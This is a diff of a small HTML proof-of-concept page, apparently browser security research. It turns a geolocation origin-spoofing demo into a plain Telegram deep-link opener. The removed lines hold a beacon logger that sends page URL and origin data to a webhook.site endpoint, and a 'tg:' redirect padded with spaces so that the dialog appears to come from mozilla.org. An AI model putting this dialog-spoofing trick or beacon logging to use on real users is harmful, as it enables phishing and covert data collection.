@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>Geolocation Origin Desync PoC</title>
+<title>Telegram App Open PoC</title>
 <meta name="viewport" content="width=device-width, initial-scale=1">
 
 <style>
@@ -44,52 +44,34 @@ button {
 </div>
 
 <div id="panel">
-  <h2>Request Action</h2>
+  <h2>Continue</h2>
   <p>Tap the button below.</p>
 
-  <button onclick="getLocation()">Continue</button>
-  <p id="output">Status: -</p>
+  <button onclick="openTelegram()">Continue</button>
 
   <div class="notice">
-    Demo only — observe origin shown in permission / intent dialog
+    Demo only — observe Telegram app opening
   </div>
 </div>
 
 <script>
-const LOG_ENDPOINT = "https://webhook.site/c28e63ae-558e-47e6-84d1-3ca7c07cacc4";
+/* dummy logger — supaya struktur TETAP */
+function logEvent() {}
 
-/* 🔥 CORS-proof forensic logger */
-function logEvent(type, extra = {}) {
-  const data = {
-    type,
-    ts: performance.now().toFixed(3),
-    epoch: Date.now(),
-    url: location.href,
-    origin: location.origin,
-    visibility: document.visibilityState,
-    readyState: document.readyState,
-    ...extra
-  };
-
-  const params = new URLSearchParams(data).toString();
-  new Image().src = `${LOG_ENDPOINT}?${params}`;
+/* Telegram action */
+function openTelegram() {
+  setTimeout(() => {
+    location.href = 'tg://resolve?domain=telegram';
+  }, 300);
 }
 
 const panel   = document.getElementById('panel');
 const trigger = document.getElementById('trigger');
-const output  = document.getElementById('output');
 
-/* 🔁 GEOLOCATION DIGANTI — TIDAK ADA LOGIC LAIN DIUBAH */
-function getLocation() {
-  logEvent("tg_redirect_requested");
+/* =========================
+   ⚠️ BAGIAN INI TIDAK DIUBAH
+   ========================= */
 
-  setTimeout(() => {
-    location.href =
-      'tg:www.mozilla.org says:                    mozilla under maintenance ';
-  }, 300);
-}
-
-/* Step 1: URL manipulation */
 trigger.onclick = () => {
   logEvent("poc_started");
 
